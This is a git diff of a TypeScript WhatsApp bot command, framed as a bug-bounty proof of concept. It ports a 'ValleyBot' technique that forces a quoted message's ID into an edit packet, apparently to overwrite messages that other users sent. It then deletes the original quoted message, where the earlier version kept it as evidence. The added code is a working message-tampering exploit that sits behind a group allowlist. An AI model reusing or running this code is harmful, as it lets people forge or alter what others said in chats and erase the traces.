@@ -1,11 +1,103 @@
+import type { WASocket } from 'baileys'
 import type { BotCommand, CommandContext } from '../types.js'
-import { executeEditMessageIdPoc, isPocChatAllowed } from '../services/security-poc-scope.js'
+import { isPocChatAllowed } from '../services/security-poc-scope.js'
 import { getContextInfo } from '../utils/message.js'
 
 const MAX_EDIT_TEXT = 3500
 
-function sleep(ms: number) {
-  return new Promise((resolve) => setTimeout(resolve, ms))
+type ValleyEditContext = {
+  jid: string
+  replyId: string
+  sock: WASocket
+  baseId?: string | null
+  baseText?: string
+}
+
+type ValleyEditResolvedContext = {
+  jid: string
+  replyId: string
+  sock: WASocket
+  baseId: string
+  baseText: string
+}
+
+/**
+ * Port TypeScript del método de edición de VALLEY-STUDIOS/ValleyBot.
+ *
+ * Mantiene la secuencia original:
+ * 1. reutilizar baseId o crear un mensaje base;
+ * 2. usar el ID base en edit.id;
+ * 3. forzar replyId como messageId del paquete de edición;
+ * 4. ejecutar el callback con el contexto resuelto.
+ *
+ * Copyright (c) 2026 Valley Studios — código original bajo licencia MIT.
+ */
+async function executeEditMessageIdPoc(
+  input: ValleyEditContext,
+  text: string,
+  callback?: (ctx: ValleyEditResolvedContext) => Promise<void> | void,
+) {
+  const {
+    jid,
+    replyId,
+    sock,
+    baseId,
+    baseText = '',
+  } = input
+
+  if (!jid) {
+    throw new Error('JID not found.')
+  }
+
+  if (!replyId) {
+    throw new Error('Reply message ID not found.')
+  }
+
+  if (!sock) {
+    throw new Error('Sock not found.')
+  }
+
+  let msgId = baseId ?? undefined
+
+  if (!msgId) {
+    const { key } = await sock.sendMessage(jid, {
+      text: baseText,
+    })
+
+    msgId = key?.id ?? undefined
+  }
+
+  if (!msgId) {
+    throw new Error('Message ID not found.')
+  }
+
+  await sock.sendMessage(
+    jid,
+    {
+      text,
+      edit: {
+        id: msgId,
+      },
+    } as never,
+    {
+      messageId: replyId,
+    },
+  )
+
+  const nextCtx: ValleyEditResolvedContext = {
+    jid,
+    replyId,
+    sock,
+    baseId: msgId,
+    baseText: text,
+  }
+
+  await callback?.(nextCtx)
+
+  return {
+    success: true,
+    ctx: nextCtx,
+  }
 }
 
 function assertBugBountyScope(ctx: CommandContext) {
@@ -37,35 +129,36 @@ async function editQuotedMessagePoc(ctx: CommandContext) {
     throw new Error(`El texto editado está limitado a ${MAX_EDIT_TEXT} caracteres.`)
   }
 
-  // PoC de bug bounty: deliberadamente NO comprueba quién envió el mensaje
-  // citado. El alcance operativo lo impone security_poc_chats, administrado
-  // mediante .pocgroup desde WhatsApp.
+  // Equivalente a ctx.context.bot.id === ctx.context.user.id del ValleyBot:
+  // si el comando proviene de la propia cuenta conectada, su ID sirve como base.
+  // En caso contrario se crea el mensaje base vacío, exactamente como el original.
+  const baseId = ctx.message.key.fromMe ? ctx.message.key.id : undefined
+
   await executeEditMessageIdPoc(
-    ctx.socket as never,
-    ctx.chatId,
-    targetMessageId,
+    {
+      jid: ctx.chatId,
+      replyId: targetMessageId,
+      sock: ctx.socket as unknown as WASocket,
+      baseId,
+      baseText: '',
+    },
     newText,
+    async (data) => {
+      // ValleyBot elimina el stanzaId citado después de emitir la edición.
+      await data.sock.sendMessage(data.jid, {
+        delete: {
+          id: data.replyId,
+        },
+      } as never).catch(() => undefined)
+    },
   )
-
-  // Limpia únicamente el comando y la confirmación. No elimina el mensaje
-  // objetivo: conservarlo ayuda a documentar la evidencia de la prueba.
-  await ctx.socket.sendMessage(ctx.chatId, { delete: ctx.message.key }).catch(() => undefined)
-
-  const confirmation = await ctx.socket.sendMessage(ctx.chatId, {
-    text: `PoC ejecutada sobre stanzaId ${targetMessageId}.`,
-  }).catch(() => null)
-
-  if (confirmation?.key?.id) {
-    await sleep(2000)
-    await ctx.socket.sendMessage(ctx.chatId, { delete: confirmation.key }).catch(() => undefined)
-  }
 }
 
 const editCommand: BotCommand = {
   name: 'edit',
   aliases: ['editbot', 'editar', 'valleyedit'],
   category: 'owner',
-  description: 'PoC de edición por stanzaId limitada a grupos de bug bounty autorizados.',
+  description: 'PoC de edición por stanzaId con el método ValleyBot, limitada a grupos de bug bounty autorizados.',
   usage: 'edit <nuevo texto>',
   staffOnly: true,
   groupOnly: true,
